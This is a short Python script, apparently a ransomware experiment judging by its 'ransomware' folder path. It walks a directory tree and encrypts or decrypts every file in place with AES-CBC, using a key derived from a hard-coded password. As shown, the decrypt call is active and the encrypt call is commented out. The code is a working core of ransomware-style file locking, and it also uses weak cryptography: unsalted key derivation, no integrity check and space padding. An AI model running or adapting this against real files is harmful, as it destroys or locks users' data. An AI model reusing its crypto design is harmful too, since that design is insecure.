import os
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random

def encrypt(key, path):
    chunksize = 64*1024
    enc_file = os.path.dirname(path) + '/enc_' + os.path.basename(path)
    filesize = str(os.path.getsize(path)).zfill(16)
    IV = Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(path, 'rb') as infile:
        with open(enc_file, 'wb') as outfile:
            outfile.write(filesize.encode('utf8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk)%16 != 0:
                    chunk += b' ' * (16-(len(chunk)%16))

                outfile.write(encryptor.encrypt(chunk))
    os.replace(enc_file, path)

def decrypt(key, path):
    chunksize = 64*1024
    dec_file = os.path.dirname(path) + '/dec_' + os.path.basename(path)

    with open(path, 'rb') as infile:
        filesize = int(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(dec_file, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(filesize)

    os.replace(dec_file, path)

def getKey(password):
    hasher = SHA256.new(password.encode('utf8'))
    return hasher.digest()

def main(folder):
    files = []

    for r, d, f in os.walk(folder):
        for file in f:
            files.append(os.path.join(r, file))
    for f in files:
        decrypt(getKey('trietsuper'), f)
        # encrypt(getKey('trietsuper'), f)

main('/home/n0bita/Desktop/ransomware/files')
